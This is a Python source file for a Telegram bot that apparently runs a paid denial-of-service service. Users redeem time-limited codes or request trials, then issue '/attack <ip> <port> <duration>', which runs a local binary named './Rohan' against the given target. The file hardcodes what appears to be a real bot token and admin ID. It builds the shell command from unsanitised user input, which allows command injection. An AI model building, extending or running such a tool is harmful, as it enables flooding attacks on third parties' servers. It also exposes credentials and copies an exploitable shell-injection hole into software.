import os
import asyncio
import random
import string
import json
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

# Load the bot token from environment variables for security
TELEGRAM_BOT_TOKEN = '7841774667:AAF89OHjLZTaI8vnwOYGGRTX5LCZGfJXhD4'  # Replace with your actual token
ADMIN_ID = '1866961136'  # Replace with your admin user ID as a string
DATA_FILE = 'data.json'  # File to store persistent data

# Store attacked IPs
attacked_ips = set()

# User access mapping
user_access = {}
# Code mappings for access
redeem_codes = {}
# Store trial requests
trial_requests = {}

def load_data():
    """Load data from a JSON file."""
    global user_access, redeem_codes, trial_requests
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            data = json.load(f)
            user_access = data.get('user_access', {})
            redeem_codes = data.get('redeem_codes', {})
            trial_requests = data.get('trial_requests', {})

def save_data():
    """Save data to a JSON file."""
    data = {
        'user_access': user_access,
        'redeem_codes': redeem_codes,
        'trial_requests': trial_requests
    }
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f)

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    help_message = (
        "*🔧 Help - Available Commands:* \n\n"
        "*1. /start* - Welcome message and instructions on how to use the bot.\n"
        "*2. /redeem <duration>* - Admin command to generate a redeem code for the specified duration (1, 5, 7, or 30 days).\n"
        "*3. /redeem_code <code>* - Redeem your access using the generated code.\n"
        "*4. /attack <ip> <port> <duration>* - Launch an attack on the specified IP, port, and duration (in seconds).\n"
        "*5. /trail* - Request a trial of the bot's features.\n"
        "*6. /add <user_id or group_id>* - Admin command to grant access to the specified user or group.\n"
        "*7. /remove <user_id or group_id>* - Admin command to revoke access from the specified user or group.\n"
        "*8. /help* - Show this help message with a list of available commands.\n"
    )
    
    await context.bot.send_message(chat_id=chat_id, text=help_message, parse_mode='Markdown')

async def generate_redeem_code(user_name, duration_hours=1):
    """Generates a unique redeem code for the user."""
    code_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
    code = f"{user_name}-{code_suffix}"
    
    # Store the expiry time
    expiry_time = datetime.now() + timedelta(hours=duration_hours)
    redeem_codes[code] = expiry_time.isoformat()
    
    return code

async def redeem_access(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    # Check if the message sender is the admin
    if user_id != ADMIN_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to generate codes!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <duration>* \n*Available durations: 1, 5, 7, or 30*", parse_mode='Markdown')
        return

    duration = context.args[0]
    duration_mapping = {
        '1': timedelta(days=1),
        '5': timedelta(days=5),
        '7': timedelta(days=7),
        '30': timedelta(days=30)
    }

    if duration not in duration_mapping:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid duration! Use 1, 5, 7, or 30 days.*", parse_mode='Markdown')
        return

    # Generate a unique redeem code
    user_name = update.effective_user.username if update.effective_user.username else "User"
    code = await generate_redeem_code(user_name)

    # Store the valid redeem code with its expiration
    expiry_time = datetime.now() + duration_mapping[duration]
    redeem_codes[code] = expiry_time.isoformat()

    save_data()  # Save after generating the redeem code

    # Create a user-friendly message
    escaped_code = code.replace("_", "\\_").replace("*", "\\*").replace("[", "\\[").replace("`", "\\`")

    message = (
        "*✅ Redemption code generated!*\n"
        f"*Code:* `{escaped_code}`\n"
        f"*Access Duration:* {duration} days\n"
        "*To redeem, use: `/redeem_code <your_code>`*"
    )

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem_code <code>*", parse_mode='Markdown')
        return

    code = context.args[0]

    if code not in redeem_codes:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid or expired code!*", parse_mode='Markdown')
        return

    # Assign access to the user and clean up the code
    expiry_time = datetime.fromisoformat(redeem_codes.pop(code))
    user_access[user_id] = expiry_time.isoformat()
    save_data()  # Save data after redeeming the code

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Code redeemed successfully!*\n*Your access expires on: {expiry_time}*", parse_mode='Markdown')

async def has_access(user_id, chat_member=None):
    """Check if the user has valid access based on user ID and group memberships."""
    current_time = datetime.now()
    
    # Check direct user access
    user_access_time = user_access.get(user_id)
    if user_access_time and datetime.fromisoformat(user_access_time) > current_time:
        return True

    # Check if the user has access to groups and if they are members of those groups
    for group_id in user_access:
        if group_id.startswith("-"):  # Check if group ID
            group_access_time = datetime.fromisoformat(user_access[group_id])
            if group_access_time > current_time:
                if chat_member and chat_member.status in ['member', 'administrator', 'creator']:
                    return True

    return False

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./Rohan  {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    # Get the chat member information to check group membership
    chat_member = None
    try:
        chat_member = await context.bot.get_chat_member(chat_id, user_id)
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Unable to verify your membership status.*", parse_mode='Markdown')
        return 

    if not await has_access(user_id, chat_member):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Your access has expired or you do not have access. Please redeem a new code with /redeem_code <code>.*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    if ip in attacked_ips:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ This IP ({ip}) has already been attacked!*\n*Try another target.*", parse_mode='Markdown')
        return

    attacked_ips.add(ip)

    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def trail(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    user_name = update.effective_user.username if update.effective_user.username else "User"

    # Notify the admin about the trial request
    trial_requests[user_id] = user_name
    save_data()

    admin_message = (
        f"User @{user_name} has requested a trial.\n"
        "Please approve or disapprove the request."
    )

    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_message)

    # Create inline keyboard for admin to approve or disapprove request
    keyboard = [
        [InlineKeyboardButton("Approve", callback_data=f"approve_{user_id}"),
         InlineKeyboardButton("Disapprove", callback_data=f"disapprove_{user_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(chat_id=ADMIN_ID, text="Choose an option:", reply_markup=reply_markup)
    await context.bot.send_message(chat_id=chat_id, text="*✅ Your request for a trial has been sent to the admin.*", parse_mode='Markdown')

async def approve_trial(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()

    user_id = query.data.split("_")[1]
    user_name = trial_requests.pop(user_id, None)

    if user_name is None:
        await query.message.reply_text("No trial request found.")
        return

    # Generate redeem code for one hour
    redeem_code = await generate_redeem_code(user_name, duration_hours=1)

    message = (
        f"Here is your trial! Use redeem code: `{redeem_code}`\n"
        "Type the `/redeem_code` command to access the /attack now. The redeem code is valid for 1 hour."
    )

    await context.bot.send_message(chat_id=user_id, text=message, parse_mode='Markdown')
    await query.message.reply_text(f"Trial for @{user_name} approved.")

async def disapprove_trial(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()

    user_id = query.data.split("_")[1]
    user_name = trial_requests.pop(user_id, None)

    if user_name is None:
        await query.message.reply_text("No trial request found.")
        return

    message = (
        f"Sorry, you cannot get a trial. Please contact: @YourAdminUsername"
    )

    await context.bot.send_message(chat_id=user_id, text=message, parse_mode='Markdown')
    await query.message.reply_text(f"Trial for @{user_name} disapproved.")

async def add_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    # Check if the message sender is the admin
    if user_id != ADMIN_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to add users!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /add <user_id or group_id>*", parse_mode='Markdown')
        return

    new_access_id = context.args[0]  # can be user ID or group ID
    user_access[new_access_id] = datetime.now().isoformat()  # Grant access indefinitely

    save_data()  # Save the changes

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Access granted to {new_access_id} for /attack!*", parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    # Check if the message sender is the admin
    if user_id != ADMIN_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to remove users!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /remove <user_id or group_id>*", parse_mode='Markdown')
        return

    user_to_remove = context.args[0]  # can be user ID or group ID
    if user_to_remove in user_access:
        del user_access[user_to_remove]  # Remove access
        save_data()  # Save the changes
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Access revoked from {user_to_remove} for /attack!*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ {user_to_remove} does not have access to remove!*", parse_mode='Markdown')

def main():
    load_data()  # Load data on startup

    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("redeem", redeem_access))
    application.add_handler(CommandHandler("redeem_code", redeem_code))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("trail", trail))  
    application.add_handler(CommandHandler("add", add_user))  # Add user command
    application.add_handler(CommandHandler("remove", remove_user))  # Remove user command
    
    # Callback handlers for the inline keyboard
    application.add_handler(CallbackQueryHandler(approve_trial, pattern=r"approve_.*"))
    application.add_handler(CallbackQueryHandler(disapprove_trial, pattern=r"disapprove_.*"))

    application.run_polling()

if __name__ == '__main__':
    main()